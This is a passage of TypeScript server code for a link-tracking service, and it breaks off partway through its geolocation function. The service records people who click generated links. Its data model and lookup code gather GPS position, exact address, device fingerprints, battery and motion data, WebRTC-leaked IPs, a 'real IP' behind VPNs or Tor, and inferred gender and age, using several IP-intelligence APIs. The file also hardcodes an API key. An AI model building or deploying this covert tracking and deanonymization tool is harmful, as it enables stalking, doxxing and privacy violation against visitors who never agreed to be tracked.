import express from 'express';
import path from 'path';
import fs from 'fs';
import dns from 'dns';
import https from 'https';
import net from 'net';
import helmet from 'helmet';
import rateLimit from 'express-rate-limit';
import { createServer as createViteServer } from 'vite';
import PDFDocument from 'pdfkit';
import { promisify } from 'util';
import { GoogleGenAI } from '@google/genai';

const resolveDns = promisify(dns.resolveAny);
const PORT = 3000;
const DB_FILE = path.join(process.cwd(), 'data', 'db.json');

let genAiClient: GoogleGenAI | null = null;
function getGenAI(): GoogleGenAI | null {
  if (!genAiClient && process.env.GEMINI_API_KEY) {
    genAiClient = new GoogleGenAI({ apiKey: process.env.GEMINI_API_KEY });
  }
  return genAiClient;
}

if (!fs.existsSync(path.join(process.cwd(), 'data'))) {
  fs.mkdirSync(path.join(process.cwd(), 'data'), { recursive: true });
}

interface StoredLink {
  id: string;
  code: string;
  originalUrl: string;
  mode: 'precise' | 'near' | 'pdf';
  userToken: string;
  createdAt: string;
  visitCount: number;
}

interface StoredVisit {
  id: string;
  linkId: string;
  code: string;
  visitorToken: string;
  ip: string;
  country: string | null;
  countryCode: string | null;
  city: string | null;
  region: string | null;
  zip: string | null;
  exactAddress?: string | null;
  lat: number | null;
  lon: number | null;
  isGps: boolean;
  accuracy: number | null;
  altitude: number | null;
  altitudeAccuracy: number | null;
  heading: number | null;
  speed: number | null;
  isp: string | null;
  org: string | null;
  asn: string | null;
  asName?: string | null;
  reverseDns?: string | null;
  ipRouting?: string | null;
  usageType?: string | null;
  isMobileCarrier: boolean | null;
  isProxyVpn: boolean | null;
  networkMedium?: string | null;
  proxyType?: string | null;
  currency: string | null;
  browser: string;
  os: string;
  device: string;
  battery: number | null;
  batteryCharging: boolean | null;
  batteryChargingTime?: number | null;
  batteryDischargingTime?: number | null;
  localTime: string | null;
  timezone: string | null;
  systemTimezone?: string | null;
  ipTimezone?: string | null;
  timezoneOffset?: number | null;
  timezoneMismatch?: boolean | null;
  timezoneDifference?: string | null;
  clockTamperDetected?: boolean | null;
  screenWidth: number | null;
  screenHeight: number | null;
  colorDepth: number | null;
  pixelRatio: number | null;
  orientation: string | null;
  cpuCores: number | null;
  ram: number | null;
  gpu: string | null;
  gpuVendor: string | null;
  touchPoints: number | null;
  connectionType: string | null;
  downlink: number | null;
  rtt: number | null;
  language: string | null;
  languages: string | null;
  doNotTrack: string | null;
  cookiesEnabled: boolean | null;
  userAgent: string;
  // Advanced Telemetry & Fingerprinting
  deviceFingerprint?: string | null;
  canvasFingerprint?: string | null;
  webglFingerprint?: string | null;
  audioFingerprint?: string | null;
  webglExtensionsCount?: number | null;
  maxTextureSize?: number | null;
  webglVendor?: string | null;
  webglRenderer?: string | null;
  browserPlugins?: string | null;
  fontsCount?: number | null;
  webdriver?: boolean | null;
  pdfViewerEnabled?: boolean | null;
  refreshRate?: number | null;
  permissions?: string | null;
  deviceTimestamp?: number | null;
  deviceLocalTime?: string | null;
  // VPN Unveil & Leak Diagnostics
  vpnProviderName?: string | null;
  webrtcLocalIp?: string | null;
  webrtcPublicIp?: string | null;
  dnsLeakIsp?: string | null;
  candidateOriginalLocation?: string | null;
  mismatchScore?: number | null;
  deviceManufacturer?: string | null;
  isBot?: boolean | null;
  botName?: string | null;
  // Latency Triangulation
  latencyCloudflare?: number | null;
  latencyGoogle?: number | null;
  latencyServer?: number | null;
  latencyAvg?: number | null;
  // Motion & Orientation
  motionDetected?: boolean | null;
  accelerationX?: number | null;
  accelerationY?: number | null;
  accelerationZ?: number | null;
  orientationAlpha?: number | null;
  orientationBeta?: number | null;
  orientationGamma?: number | null;
  devicePosture?: string | null;
  // User-Agent Client Hints
  uaArchitecture?: string | null;
  uaModel?: string | null;
  uaPlatformVersion?: string | null;
  uaFullVersion?: string | null;
  uaFullVersionList?: string | null;
  // Demographic & Deep Browser Inferences
  colorScheme?: string | null;
  reducedMotion?: boolean | null;
  inferredGender?: string | null;
  inferredAgeBracket?: string | null;
  browserPersona?: string | null;
  torSuspected?: boolean | null;
  realIpCandidate?: string | null;
  createdAt: string;
}

interface DatabaseSchema {
  links: StoredLink[];
  visits: StoredVisit[];
  totalLinksCreated?: number;
  totalVisitsCreated?: number;
}

function loadDatabase(): DatabaseSchema {
  try {
    if (fs.existsSync(DB_FILE)) {
      const data = fs.readFileSync(DB_FILE, 'utf-8');
      const db = JSON.parse(data);
      if (typeof db.totalLinksCreated !== 'number') {
        db.totalLinksCreated = db.links.length;
      }
      if (typeof db.totalVisitsCreated !== 'number') {
        db.totalVisitsCreated = db.visits.length;
      }
      return db;
    }
  } catch (err) {
    console.error('Error loading database file:', err);
  }
  return { links: [], visits: [], totalLinksCreated: 0, totalVisitsCreated: 0 };
}

function saveDatabase(db: DatabaseSchema) {
  try {
    const tempFile = `${DB_FILE}.tmp`;
    fs.writeFileSync(tempFile, JSON.stringify(db, null, 2), 'utf-8');
    fs.renameSync(tempFile, DB_FILE);
  } catch (err) {
    console.error('Error saving database file:', err);
  }
}

function generateCode(length = 8): string {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function generateToken(length = 16): string {
  const chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
  let result = '';
  for (let i = 0; i < length; i++) {
    result += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  return result;
}

function getFlagEmoji(countryCode: string | null): string {
  if (!countryCode || countryCode.length !== 2) return '🌐';
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map((char) => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

function parseTzOffsetMinutes(tzString: string | null | undefined): number | null {
  if (!tzString || typeof tzString !== 'string') return null;
  const str = tzString.trim();

  const offsetRegex = /^(?:UTC|GMT)?\s*([+-])\s*(\d{1,2})(?::?(\d{2}))?$/i;
  const match = str.match(offsetRegex);
  if (match) {
    const sign = match[1] === '-' ? -1 : 1;
    const hours = parseInt(match[2], 10);
    const mins = match[3] ? parseInt(match[3], 10) : 0;
    return sign * (hours * 60 + mins);
  }

  try {
    const now = new Date();
    const formatterInTz = new Intl.DateTimeFormat('en-US', {
      timeZone: str,
      year: 'numeric',
      month: 'numeric',
      day: 'numeric',
      hour: 'numeric',
      minute: 'numeric',
      second: 'numeric',
      hour12: false,
    });
    const formatterUtc = new Intl.DateTimeFormat('en-US', {
      timeZone: 'UTC',
      year: 'numeric',
      month: 'numeric',
      day: 'numeric',
      hour: 'numeric',
      minute: 'numeric',
      second: 'numeric',
      hour12: false,
    });

    const partsTz = formatterInTz.formatToParts(now);
    const partsUtc = formatterUtc.formatToParts(now);

    const getVal = (parts: Intl.DateTimeFormatPart[], type: string) =>
      parseInt(parts.find((p) => p.type === type)?.value || '0', 10);

    const dateTz = Date.UTC(
      getVal(partsTz, 'year'),
      getVal(partsTz, 'month') - 1,
      getVal(partsTz, 'day'),
      getVal(partsTz, 'hour'),
      getVal(partsTz, 'minute'),
      getVal(partsTz, 'second')
    );

    const dateUtc = Date.UTC(
      getVal(partsUtc, 'year'),
      getVal(partsUtc, 'month') - 1,
      getVal(partsUtc, 'day'),
      getVal(partsUtc, 'hour'),
      getVal(partsUtc, 'minute'),
      getVal(partsUtc, 'second')
    );

    return Math.round((dateTz - dateUtc) / (60 * 1000));
  } catch {
    return null;
  }
}

// Robust OS & Device Identification (Fixes Android classified as Linux)
function cleanOS(ua: string, clientHintModel?: string, uaPlatformVersion?: string): { os: string; device: string } {
  const lower = ua.toLowerCase();

  // 1. Android Check (Must be evaluated FIRST before any Linux check)
  if (lower.includes('android')) {
    let osVer = 'Android';
    if (uaPlatformVersion && uaPlatformVersion.trim() && uaPlatformVersion !== 'Unknown') {
      const major = uaPlatformVersion.split('.')[0];
      osVer = `Android ${major}`;
    } else {
      const vMatch = ua.match(/Android\s+([0-9\.]+)/i);
      osVer = vMatch ? `Android ${vMatch[1]}` : 'Android';
    }

    if (clientHintModel && clientHintModel.trim() && clientHintModel !== 'Unknown') {
      return { os: osVer, device: clientHintModel.trim() };
    }

    let deviceModel = 'Android Phone/Tablet';
    // Match Build info e.g. "SM-S928B Build/..." or "Pixel 8 Build/..."
    const buildMatch = ua.match(/;\s*([^;]+?)\s*Build\//i);
    if (buildMatch && buildMatch[1]) {
      const raw = buildMatch[1].trim();
      if (!raw.toLowerCase().includes('linux') && !raw.toLowerCase().includes('wv')) {
        deviceModel = raw;
      }
    } else {
      const modelMatch = ua.match(/Android[^;]+;\s*([^;\)]+)/i);
      if (modelMatch && modelMatch[1]) {
        const raw = modelMatch[1].trim();
        if (!raw.toLowerCase().includes('linux') && !raw.toLowerCase().includes('k')) {
          deviceModel = raw;
        }
      }
    }

    // Friendly brand recognition
    if (deviceModel.startsWith('SM-') || deviceModel.includes('SAMSUNG')) {
      deviceModel = `Samsung (${deviceModel})`;
    } else if (deviceModel.includes('Pixel')) {
      deviceModel = `Google ${deviceModel}`;
    } else if (deviceModel.startsWith('Redmi') || deviceModel.startsWith('M20') || deviceModel.startsWith('220')) {
      deviceModel = `Xiaomi/Redmi (${deviceModel})`;
    } else if (deviceModel.startsWith('CPH') || deviceModel.includes('OPPO')) {
      deviceModel = `Oppo (${deviceModel})`;
    } else if (deviceModel.startsWith('RMX')) {
      deviceModel = `Realme (${deviceModel})`;
    } else if (deviceModel.startsWith('V2') || deviceModel.includes('vivo')) {
      deviceModel = `Vivo (${deviceModel})`;
    } else if (deviceModel.includes('HUAWEI') || deviceModel.startsWith('CLT-') || deviceModel.startsWith('ELS-')) {
      deviceModel = `Huawei (${deviceModel})`;
    }

    return { os: osVer, device: deviceModel };
  }

  // 2. iOS (iPhone, iPad, iPod)
  if (lower.includes('iphone')) {
    const vMatch = ua.match(/OS\s+([0-9_]+)/i);
    const osVer = vMatch ? `iOS ${vMatch[1].replace(/_/g, '.')}` : 'iOS';
    return { os: osVer, device: 'iPhone' };
  }
  if (lower.includes('ipad')) {
    const vMatch = ua.match(/OS\s+([0-9_]+)/i);
    const osVer = vMatch ? `iPadOS ${vMatch[1].replace(/_/g, '.')}` : 'iPad';
    return { os: osVer, device: 'iPad' };
  }

  // 3. Windows
  if (lower.includes('windows nt 10.0')) {
    let osName = 'Windows 10';
    if (uaPlatformVersion && uaPlatformVersion.trim() && uaPlatformVersion !== 'Unknown') {
      const major = parseInt(uaPlatformVersion.split('.')[0]);
      // Windows 11 platform version is usually 13.0.0 or higher
      if (major >= 13) osName = 'Windows 11';
    }
    return { os: osName, device: 'PC Desktop/Laptop' };
  }
  if (lower.includes('windows nt 6.3')) return { os: 'Windows 8.1', device: 'PC' };
  if (lower.includes('windows nt 6.1')) return { os: 'Windows 7', device: 'PC' };
  if (lower.includes('windows')) return { os: 'Windows', device: 'PC' };

  // 4. macOS
  if (lower.includes('macintosh') || lower.includes('mac os x')) {
    const vMatch = ua.match(/Mac OS X\s+([0-9_\.]+)/i);
    const osVer = vMatch ? `macOS ${vMatch[1].replace(/_/g, '.')}` : 'macOS';
    return { os: osVer, device: 'Apple Mac' };
  }

  // 5. ChromeOS
  if (lower.includes('cros')) {
    return { os: 'ChromeOS', device: 'Chromebook' };
  }

  // 6. Linux PC (Strictly Desktop Linux, not Android)
  if (lower.includes('linux')) {
    if (lower.includes('ubuntu')) return { os: 'Ubuntu Linux', device: 'Linux PC' };
    if (lower.includes('fedora')) return { os: 'Fedora Linux', device: 'Linux PC' };
    if (lower.includes('debian')) return { os: 'Debian Linux', device: 'Linux PC' };
    return { os: 'Linux Desktop', device: 'Linux PC' };
  }

  return { os: 'Unknown OS', device: clientHintModel || 'Unknown Device' };
}

function cleanBrowser(ua: string): string {
  if (ua.includes('Edg/')) return 'Microsoft Edge';
  if (ua.includes('OPR/') || ua.includes('Opera')) return 'Opera';
  if (ua.includes('SamsungBrowser')) return 'Samsung Internet';
  if (ua.includes('Firefox/')) return 'Mozilla Firefox';
  if (ua.includes('Chrome/') && !ua.includes('Edg/')) return 'Google Chrome';
  if (ua.includes('Safari/') && !ua.includes('Chrome/')) return 'Apple Safari';
  return 'Browser';
}

function detectBot(ua: string): { isBot: boolean; botName: string | null } {
  if (!ua) return { isBot: false, botName: null };
  const lower = ua.toLowerCase();
  const botKeywords = [
    { key: 'googlebot', name: 'Googlebot Crawler' },
    { key: 'bingbot', name: 'Microsoft Bingbot' },
    { key: 'yandex', name: 'Yandex Bot' },
    { key: 'duckduckbot', name: 'DuckDuckGo Bot' },
    { key: 'baiduspider', name: 'Baidu Spider' },
    { key: 'facebookexternalhit', name: 'Facebook Crawler' },
    { key: 'twitterbot', name: 'Twitter / X Bot' },
    { key: 'telegrambot', name: 'Telegram Link Previewer' },
    { key: 'whatsapp', name: 'WhatsApp Link Preview' },
    { key: 'linkedinbot', name: 'LinkedIn Bot' },
    { key: 'slackbot', name: 'Slackbot' },
    { key: 'discordbot', name: 'Discordbot' },
    { key: 'applebot', name: 'Applebot' },
    { key: 'curl', name: 'cURL Command Line Tool' },
    { key: 'wget', name: 'Wget Command Tool' },
    { key: 'python-requests', name: 'Python Requests Script' },
    { key: 'postmanruntime', name: 'Postman API Client' },
    { key: 'headlesschrome', name: 'Headless Chrome Automation' },
    { key: 'puppeteer', name: 'Puppeteer Automation' },
    { key: 'selenium', name: 'Selenium Automation' },
    { key: 'bot', name: 'Generic Crawler / Bot' },
    { key: 'spider', name: 'Generic Spider' },
    { key: 'crawler', name: 'Generic Web Crawler' },
  ];

  for (const b of botKeywords) {
    if (lower.includes(b.key)) {
      return { isBot: true, botName: b.name };
    }
  }
  return { isBot: false, botName: null };
}

// Comprehensive Network & Security Classifiers
const KNOWN_VPN_REGEX =
  /vpn|proxy|tor|exit|relay|anonymizer|privacy|nord|nordvpn|expressvpn|surfshark|mullvad|proton|protonvpn|windscribe|ipvanish|cyberghost|private internet access|\bpia\b|purevpn|tunnelbear|hidemyass|astrill|shadowsocks|wireguard|openvpn|tailscale|zerotier|vpnbook|hide\.me|hidester|proxysite|urban vpn|touch vpn|supervpn|turbo vpn|melon vpn|vpn proxy master|vpn master|speedify|psiphon|lantern|betternet|octohide|privadovpn|torguard|airvpn|perfect privacy|ovpn|zenmate|strongvpn|cactusvpn|blackvpn|zoogvpn|fastestvpn|trust\.zone|vpnunlimited|keepsolid|express vpn|surf shark|nord vpn|mullvad vpn|proton vpn/i;

const KNOWN_HOSTING_REGEX =
  /digitalocean|linode|vultr|hetzner|ovh|leaseweb|choopa|datacamp|m247|hostinger|contabo|scaleway|oracle|alibaba|tencent|cogent|hurricane electric|he\.net|hostkey|datapacket|fly\.io|railway|render|equinix|dedicated|hosting|datacenter|data center|vps|server/i;

const KNOWN_MOBILE_CARRIER_REGEX =
  /(mobile|cellular|wireless|gsm|lte|4g|5g|3g|wcdma|vodafone|orange|stc|zain|etisalat|we mobile|telecom egypt mobile|ooredoo|jawwal|wataniya|verizon|t-mobile|tmobile|at&t mobility|att mobility|sprint|ee limited|o2|three|airtel|jio|vi india|bsnl|claro|movistar|tim|telcel|vivo|singtel|starhub|optus|telstra|du mobile|mobily|kddi|docomo|softbank|turkcell)/i;

const KNOWN_FIXED_BROADBAND_REGEX =
  /(broadband|dsl|vdsl|adsl|fiber|ftth|cable|te data|telecom egypt|we internet|orange dsl|vodafone dsl|stc broadband|mobily fiber|comcast|charter|spectrum|at&t u-verse|centurylink|bt broadband|virgin media|sky broadband|talktalk|deutsche telekom|vodafone kabel|orange fibra|movistar fibra|tim fibra)/i;

function classifyNetworkMedium(
  isProxy: boolean,
  isHosting: boolean,
  isMobileCarrier: boolean,
  isp: string | null,
  org: string | null,
  asName: string | null,
  clientConnType?: string | null
): { networkMedium: 'mobile_sim' | 'router_wifi' | 'vpn_proxy' | 'datacenter_cloud'; isMobile: boolean; isProxyVpn: boolean; isHosting: boolean } {
  const combinedText = `${isp || ''} ${org || ''} ${asName || ''}`.toLowerCase();

  // 1. If VPN / Proxy
  if (isProxy) {
    return { networkMedium: 'vpn_proxy', isMobile: isMobileCarrier, isProxyVpn: true, isHosting };
  }

  // 2. If Datacenter / Cloud
  if (isHosting) {
    return { networkMedium: 'datacenter_cloud', isMobile: isMobileCarrier, isProxyVpn: false, isHosting: true };
  }

  // 3. Check Mobile SIM / Cellular
  const clientIsCellular = clientConnType === 'cellular';
  const textMatchesMobile = KNOWN_MOBILE_CARRIER_REGEX.test(combinedText);
  const textMatchesBroadband = KNOWN_FIXED_BROADBAND_REGEX.test(combinedText);

  if (clientIsCellular || (isMobileCarrier && !textMatchesBroadband) || (textMatchesMobile && !textMatchesBroadband)) {
    return { networkMedium: 'mobile_sim', isMobile: true, isProxyVpn: false, isHosting: false };
  }

  // 4. Default for residential, Wi-Fi, Ethernet, landline DSL / Fiber / Cable
  return { networkMedium: 'router_wifi', isMobile: false, isProxyVpn: false, isHosting: false };
}

// Helper to extract VPN / Proxy provider name
async function fetchReverseDns(ip: string): Promise<string> {
  if (!ip || ip === 'Unknown' || ip === '127.0.0.1' || ip === '::1') return 'localhost';
  try {
    const ptrs = await Promise.race([
      dns.promises.reverse(ip),
      new Promise<string[]>((_, reject) => setTimeout(() => reject(new Error('timeout')), 1200)),
    ]);
    if (ptrs && ptrs[0]) return ptrs[0];
  } catch {}

  try {
    const arpaName = ip.split('.').reverse().join('.') + '.in-addr.arpa';
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 1500);
    const res = await fetch(`https://dns.google/resolve?name=${arpaName}&type=PTR`, {
      signal: controller.signal,
      headers: { Accept: 'application/json' },
    });
    clearTimeout(timer);
    if (res.ok) {
      const data = await res.json();
      if (data?.Answer?.[0]?.data) {
        const ptr = String(data.Answer[0].data).replace(/\.$/, '');
        if (ptr) return ptr;
      }
    }
  } catch {}

  return 'Unknown';
}

function formatDnsLeakIsp(dnsStr: string | null | undefined, ispStr: string | null | undefined): string {
  if (!dnsStr || dnsStr === 'Unknown') return ispStr || 'ISP Default DNS (Direct)';
  const lower = dnsStr.toLowerCase();
  if (lower.includes('tedata') || lower.includes('te.eg') || lower.includes('telecom egypt')) {
    return 'TE Data / Telecom Egypt DNS (tedata.net)';
  }
  if (lower.includes('google')) {
    return 'Google Public DNS (8.8.8.8 / 8.8.4.4)';
  }
  if (lower.includes('cloudflare') || lower.includes('one.one.one.one') || lower.includes('1.1.1.1')) {
    return 'Cloudflare DNS (1.1.1.1)';
  }
  if (lower.includes('opendns')) {
    return 'OpenDNS / Cisco Umbrella';
  }
  if (lower.includes('quad9')) {
    return 'Quad9 Secure DNS';
  }
  return dnsStr;
}

function formatWebrtcIp(raw: string | null | undefined): string | null {
  if (!raw || typeof raw !== 'string') return null;
  const str = raw.trim();
  if (/^(?:[0-9]{1,3}\.){3}[0-9]{1,3}$/.test(str)) return str;
  if (/^[0-9a-fA-F:]+$/.test(str) && str.includes(':')) return str;
  if (str.includes('.local') || /^\d+\s+\d+/.test(str) || /^[a-f0-9-]{12,}/i.test(str)) {
    return 'mDNS Protected Host (Anonymized Local Host)';
  }
  return str;
}

function extractVpnProviderName(
  isp: string | null,
  org: string | null,
  asName: string | null,
  ip2LocProvider?: string | null,
  proxyType?: string | null
): string {
  const combined = `${ip2LocProvider || ''} ${isp || ''} ${org || ''} ${asName || ''} ${proxyType || ''}`.toLowerCase();
  if (combined.includes('nord')) return 'NordVPN';
  if (combined.includes('express')) return 'ExpressVPN';
  if (combined.includes('proton')) return 'ProtonVPN';
  if (combined.includes('surfshark')) return 'Surfshark';
  if (combined.includes('mullvad')) return 'Mullvad VPN';
  if (combined.includes('cyberghost')) return 'CyberGhost VPN';
  if (combined.includes('windscribe')) return 'Windscribe VPN';
  if (combined.includes('ipvanish')) return 'IPVanish';
  if (combined.includes('pia') || combined.includes('private internet access')) return 'Private Internet Access (PIA)';
  if (combined.includes('purevpn')) return 'PureVPN';
  if (combined.includes('tunnelbear')) return 'TunnelBear';
  if (combined.includes('urban')) return 'Urban VPN';
  if (combined.includes('turbo')) return 'Turbo VPN';
  if (combined.includes('psiphon')) return 'Psiphon';
  if (combined.includes('shadowsocks')) return 'Shadowsocks Proxy';
  if (combined.includes('wireguard')) return 'WireGuard Tunnel';
  if (combined.includes('openvpn')) return 'OpenVPN Node';
  if (combined.includes('tor') || combined.includes('exit node')) return 'Tor Exit Node';
  if (combined.includes('vpn')) return 'Custom / Enterprise VPN';
  if (combined.includes('proxy')) return 'Encrypted Proxy Node';
  if (ip2LocProvider && ip2LocProvider.trim() && ip2LocProvider !== '-') return ip2LocProvider.trim();
  return 'Generic VPN / Proxy Server';
}

// IP2Location & Multi-Engine Intelligence Fusion Engine
async function fetchGeo(ip: string) {
  if (ip === '127.0.0.1' || ip === '::1' || ip.startsWith('192.168.') || ip.startsWith('10.')) {
    return {
      ip,
      country: 'Local Network',
      countryCode: 'LAN',
      flag: '🌐',
      region: 'Development Zone',
      city: 'Localhost',
      zip: '00000',
      lat: 24.7136,
      lon: 46.6753,
      isp: 'Local Intranet Service',
      org: 'Localhost Dev Intranet',
      asn: 'AS00000 Local',
      asName: 'Local Development Network',
      isMobileCarrier: false,
      isProxyVpn: false,
      isHosting: false,
      networkMedium: 'router_wifi' as const,
      proxyType: null,
      threatLevel: 'clean' as const,
      currency: 'USD',
      timezone: 'Asia/Riyadh',
      utcOffset: '+03:00',
      localTime: new Date().toLocaleTimeString(),
      vpnProviderName: 'None',
      dnsLeakIsp: 'Localhost Intranet',
      ipRouting: '127.0.0.0/8',
      reverseDns: 'localhost',
      usageType: 'Residential Broadband (Fiber / DSL)',
    };
  }

  // Primary Priority: IP2Location API
  const ip2locKey = '9D1E63A9403B6A75E006865CAF586E12';

  // Parallel Multi-Source Security & Geolocation Retrieval with IP2Location as Primary
  const [ip2LocRes, ipApiRes, ipWhoRes, proxyCheckRes] = await Promise.allSettled([
    // 1. IP2Location.io Core (Primary Source)
    (async () => {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 4000);
      try {
        const r = await fetch(
          `https://api.ip2location.io/?key=${ip2locKey}&ip=${encodeURIComponent(ip)}`,
          { signal: controller.signal }
        );
        clearTimeout(timeout);
        if (r.ok) return await r.json();
      } catch {
        clearTimeout(timeout);
      }
      return null;
    })(),

    // 2. IP-API (Secondary Fallback)
    (async () => {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 3200);
      try {
        const r = await fetch(
          `http://ip-api.com/json/${encodeURIComponent(ip)}?fields=status,message,country,countryCode,regionName,city,zip,lat,lon,timezone,offset,isp,org,as,asname,mobile,proxy,hosting,currency,reverse,query`,
          { signal: controller.signal }
        );
        clearTimeout(timeout);
        if (r.ok) return await r.json();
      } catch {
        clearTimeout(timeout);
      }
      return null;
    })(),

    // 3. IPWho.is (Secondary Fallback)
    (async () => {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 3200);
      try {
        const r = await fetch(`https://ipwho.is/${encodeURIComponent(ip)}`, { signal: controller.signal });
        clearTimeout(timeout);
        if (r.ok) return await r.json();
      } catch {
        clearTimeout(timeout);
      }
      return null;
    })(),

    // 4. ProxyCheck.io (Specialized VPN / Proxy / TOR detection)
    (async () => {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 3200);
      try {
        const r = await fetch(`https://proxycheck.io/v2/${encodeURIComponent(ip)}?vpn=1&asn=1&risk=1`, {
          signal: controller.signal,
        });
        clearTimeout(timeout);
        if (r.ok) return await r.json();
      } catch {
        clearTimeout(timeout);
      }
      return null;
    })(),
  ]);

  const ip2LocData = ip2LocRes.status === 'fulfilled' ? ip2LocRes.value : null;
  const ipApiData = ipApiRes.status === 'fulfilled' ? ipApiRes.value : null;
  const ipWhoData = ipWhoRes.status === 'fulfilled' ? ipWhoRes.value : null;
  const proxyCheckData = proxyCheckRes.status === 'fulfilled' ? proxyCheckRes.value : null;

  // Extract merged text payloads for deep heuristic scanning
  const textPayload = [
    ip2LocData?.isp,
    ip2LocData?.as,
    ip2LocData?.usage_type,
    ip2LocData?.proxy?.proxy_type,
    ip2LocData?.proxy?.provider,
    ipApiData?.isp,
    ipApiData?.org,
    ipApiData?.as,
    ipApiData?.asname,
    ipApiData?.reverse,
    ipWhoData?.connection?.isp,
    ipWhoData?.connection?.org,
    ipWhoData?.connection?.asn_name,
    ipWhoData?.connection?.domain,
  ]
    .filter(Boolean)
    .join(' ');

  const regexMatchedVpn = KNOWN_VPN_REGEX.test(textPayload);
  const regexMatchedHosting = KNOWN_HOSTING_REGEX.test(textPayload);

  // Check ProxyCheck.io specific detection
  let proxyCheckIsVpn = false;
  if (proxyCheckData && proxyCheckData[ip]) {
    const pcInfo = proxyCheckData[ip];
    if (pcInfo.proxy === 'yes' || pcInfo.type === 'VPN' || pcInfo.type === 'TOR' || pcInfo.is_vpn === true) {
      proxyCheckIsVpn = true;
    }
  }

  // Unified Security & VPN Detection Fusion (Positive match from ANY engine triggers VPN flag)
  const isProxy = Boolean(
    proxyCheckIsVpn ||
    ip2LocData?.is_proxy === true ||
    ip2LocData?.is_proxy === 'true' ||
    ip2LocData?.is_proxy === '1' ||
    ip2LocData?.proxy?.is_vpn === true ||
    ip2LocData?.proxy?.is_tor === true ||
    ip2LocData?.proxy?.is_proxy === true ||
    ipApiData?.proxy === true ||
    ipWhoData?.security?.proxy === true ||
    ipWhoData?.security?.vpn === true ||
    ipWhoData?.security?.tor === true ||
    ip2LocData?.usage_type === 'PRX' ||
    regexMatchedVpn
  );

  const isHosting = Boolean(
    !isProxy &&
    (
      ip2LocData?.proxy?.is_data_center === true ||
      ip2LocData?.usage_type === 'DCH' ||
      ipApiData?.hosting === true ||
      ipWhoData?.security?.hosting === true ||
      regexMatchedHosting
    )
  );

  const isMobileCarrier = Boolean(
    !isProxy &&
    !isHosting &&
    (
      ip2LocData?.usage_type === 'MOB' ||
      ipApiData?.mobile === true ||
      ipWhoData?.connection?.carrier === true ||
      (KNOWN_MOBILE_CARRIER_REGEX.test(textPayload) && !KNOWN_FIXED_BROADBAND_REGEX.test(textPayload))
    )
  );

  // ISP & Network Enrichment (Prioritizing IP2Location)
  let rawIsp = ip2LocData?.isp || ip2LocData?.as || ipApiData?.isp || ipWhoData?.connection?.isp || null;
  let cleanIsp = rawIsp ? rawIsp.replace(/^AS\d+\s+/i, '').trim() : null;

  let rawOrg = ip2LocData?.as || ip2LocData?.isp || ipApiData?.org || ipWhoData?.connection?.org || null;
  let cleanOrg = rawOrg ? rawOrg.replace(/^AS\d+\s+/i, '').trim() : cleanIsp;

  let rawAsn = (ip2LocData?.asn ? `AS${ip2LocData.asn}` : null) || ipApiData?.as || (ipWhoData?.connection?.asn ? `AS${ipWhoData.connection.asn}` : null);
  let cleanAsn = rawAsn;
  if (cleanAsn && !cleanAsn.startsWith('AS') && /^\d+$/.test(cleanAsn)) {
    cleanAsn = `AS${cleanAsn}`;
  } else if (cleanAsn && cleanAsn.includes(' ')) {
    const match = cleanAsn.match(/^AS\d+/i);
    if (match) cleanAsn = match[0].toUpperCase();
  }

  let asName = (ip2LocData?.as ? ip2LocData.as.replace(/^AS\d+\s*/i, '') : null) || ipApiData?.asname || ipWhoData?.connection?.asn_name || cleanIsp;

  // Reverse DNS / PTR Resolution
  let reverseDns = ip2LocData?.domain || ipApiData?.reverse || ipWhoData?.connection?.domain || null;
  if (!reverseDns || reverseDns === 'Unknown') {
    reverseDns = await fetchReverseDns(ip);
  }
  if (!reverseDns) reverseDns = 'Unknown';

  // Routing Prefix / CIDR Range
  const ipRouting = ipWhoData?.connection?.route || (cleanAsn ? `${cleanAsn} IP Prefix Block` : 'Unknown');

  // Usage Classification
  let usageType = 'Residential Broadband (Fiber / DSL)';
  if (isMobileCarrier) {
    usageType = 'Mobile Cellular Carrier (SIM / 4G / 5G)';
  } else if (isHosting) {
    usageType = 'Data Center & Cloud Hosting';
  } else if (isProxy) {
    usageType = 'Encrypted VPN / Proxy Tunnel';
  } else if (ip2LocData?.usage_type) {
    const uMap: Record<string, string> = {
      ISP: 'Fixed Line ISP',
      MOB: 'Mobile Cellular Network',
      COM: 'Commercial / Corporate Network',
      ORG: 'Organization / Campus Network',
      DCH: 'Data Center / Hosting',
      EDU: 'Academic / Educational Network',
      GOV: 'Government Agency Network',
      RES: 'Residential Broadband',
    };
    if (uMap[ip2LocData.usage_type]) {
      usageType = uMap[ip2LocData.usage_type];
    }
  }

  const { networkMedium } = classifyNetworkMedium(
    isProxy,
    isHosting,
    isMobileCarrier,
    cleanIsp,
    cleanOrg,
    asName
  );

  let threatLevel: 'clean' | 'proxy' | 'hosting' | 'unknown' = 'clean';
  if (isProxy) threatLevel = 'proxy';
  else if (isHosting) threatLevel = 'hosting';

  // Prioritized Geolocation extraction (IP2Location as Primary)
  const country = ip2LocData?.country_name || ipApiData?.country || ipWhoData?.country || null;
  const countryCode = ip2LocData?.country_code || ipApiData?.countryCode || ipWhoData?.country_code || null;
  const region = ip2LocData?.region_name || ipApiData?.regionName || ipWhoData?.region || null;
  const city = ip2LocData?.city_name || ipApiData?.city || ipWhoData?.city || null;
  const zip = ip2LocData?.zip_code || ipApiData?.zip || ipWhoData?.postal || null;

  const lat =
    (typeof ip2LocData?.latitude === 'number' ? ip2LocData.latitude : (parseFloat(ip2LocData?.latitude) || null)) ??
    (typeof ipApiData?.lat === 'number' ? ipApiData.lat : null) ??
    (typeof ipWhoData?.latitude === 'number' ? ipWhoData.latitude : null);

  const lon =
    (typeof ip2LocData?.longitude === 'number' ? ip2LocData.longitude : (parseFloat(ip2LocData?.longitude) || null)) ??
    (typeof ipApiData?.lon === 'number' ? ipApiData.lon : null) ??
    (typeof ipWhoData?.longitude === 'number' ? ipWhoData.longitude : null);

